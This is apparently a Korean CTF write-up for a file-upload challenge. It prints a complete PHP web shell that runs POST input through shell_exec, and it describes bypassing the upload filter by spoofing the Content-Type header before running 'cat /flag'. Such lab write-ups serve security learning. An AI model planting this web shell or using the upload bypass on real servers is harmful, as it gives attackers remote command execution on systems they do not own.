#43
===

이번 문제도 파일을 올려서 해결해야하는 문제로 보인다.

![](https://postfiles.pstatic.net/MjAyMDAxMThfMjAw/MDAxNTc5MzQ4MTUzOTAx.OJAzMr9y2CElantUpUMSUItD3dDnhFUBlQC_GwQwmZog.ms3pz7_WpA9hcUNeVk3CG9eSRqmxB4o8uqAn0g3rf5wg.JPEG.rlaeoghks823/K-061.jpg?type=w773)

힌트가 상단에 적혀있다

```
You must upload webshell and cat /flag
```

아무래도 webshell을 이용해서 해결하라는 문제로 보인다.

웹서핑을 통해 webshell 코드를 구해왔다.

```
<?php
if (!empty($_POST['cmd'])) {
    $cmd =shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html>
<!-- By Artyum (https://github.com/artyuum) -->
<head>
 
    <meta charset="utf-8">
 
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
    <meta name="viewport" content="width=device-width, initial-scale=1">
 
    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
 
    <title>Web Shell</title>
 
    <style>
        h2 {
            color: rgba(0, 0, 0, .75);
        }
        pre {
            padding: 15px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #ECF0F1;
        }
        .container {
            width: 850px;
        }
    </style>
 
</head>
 
<body>
 
    <div class="container">
 
        <div class="pb-2 mt-4 mb-2">
        <h1>PHP Shell</h1>
            <h2> Execute a command </h2>
        </div>
 
        <form method="POST">
            <div class="form-group">
                <label for="cmd"><strong>Command</strong></label>
                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES,'UTF-8')?>" required>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>
 
<?php if ($cmd):?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES,'UTF-8')?>
        </pre>
<?php elseif (!$cmd &&$_SERVER['REQUEST_METHOD'] =='POST'):?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre><small>No result.</small></pre>
<?php endif;?>
    </div>
 
</body>
 
</html>
```

확장자가 php인 파일을 만들어 위 코드를 그대로 넣어주고 파일을 업로드 해보았다.

![](https://postfiles.pstatic.net/MjAyMDAxMThfMjAw/MDAxNTc5MzQ4MTYxMjA2.8Sd5XvgY5U6j3xNSynT8QwSH1O9W8Fv7W2WrcPc_vx0g.V1P0m4YlGImAdioEqqffpVwzYO2u4p2mFVv6fvvCyb0g.JPEG.rlaeoghks823/K-063.jpg?type=w773)

그러나 wrong type이라는 문구와 함께 파일이 올라가질 않는다.

그래서 다른 확장자명을 가진 파일을 올려보던 도중 .png 파일은 다음과 같이 올려진다는 것을 알 수 있었다.

![](https://postfiles.pstatic.net/MjAyMDAxMThfNjUg/MDAxNTc5MzQ4MTU3MTQx.79fAAhd5yNw65A-rKlrzqqTXm53NWvKXtUZYc9WlhpUg.XF2qpw0B6vT3M71jMmrYULzo7q8LOUqxDmMayN3c0Vsg.JPEG.rlaeoghks823/K-062.jpg?type=w773)

따라서 칼리로 burpsuit를 켜서 확인해본 결과

.png 확장자는 `Content-Type: image/png` 로 처리되는 반면에

![](https://postfiles.pstatic.net/MjAyMDAxMThfMjM1/MDAxNTc5MzQ4MTY1ODA3.FDoFRqqShTopLZpVAfv_mojU04kukdwFEX2qeflGL8Ug.hxrMGxYDRVihnykr5pGafXYEijterxvErcZ7uV16jb8g.JPEG.rlaeoghks823/K-064.jpg?type=w773)

.php 확장자는 `Content-Type: application/octet-stream`로 처리되어 파일이 업로드되지 않는 것을 알 수 있었다.

원래대로라면 php파일을 올릴 때  
`Content-Type: application/octet-stream` 이것을 `Content-Type: image/png`로 변조시켜서 php파일을 png 파일로 인식시킴으로써 해결을 해줘야하지만

이상하게도 내 칼리에서는 아래 사진처럼  
`Content-Type: application/x-php`로 처리되어 그냥 올라가졌다.

![](https://postfiles.pstatic.net/MjAyMDAxMThfMTc5/MDAxNTc5MzQ4MTY5OTc0.mIJYtaCfe-BBvjsTsXKfeOcxaGFFj-gNW6pcrt9cCY4g.LXZaez_4kxlPYwSR88RrPv72KYVdT7JAl2bVFrBP_x4g.JPEG.rlaeoghks823/K-065.jpg?type=w773)
![](https://postfiles.pstatic.net/MjAyMDAxMThfMjk2/MDAxNTc5MzQ4MTc2MDQ2.FQstT9rpviCzu8JEI3b0-8W1xtzhO06SUmJuv3O8u74g.RVjXt5ApHikx9wYzjpN9syIuZcTZ3rjN39J6sQzx-TQg.JPEG.rlaeoghks823/K-066.jpg?type=w773)

링크를 타고 들어가서 `cat /flag`를 쳐줘 flag 값을 얻어 냈다.

![](https://postfiles.pstatic.net/MjAyMDAxMThfMjIw/MDAxNTc5MzQ4MTg4Nzk2.R_Hc1GQcey5wOQg4_427J_GLtpVGxUqKCQx72ALSpE0g.TlGf6jjy02vU-_20aErlVd2wGc5qOeM278I7YHhR6Isg.JPEG.rlaeoghks823/K-067.jpg?type=w773)

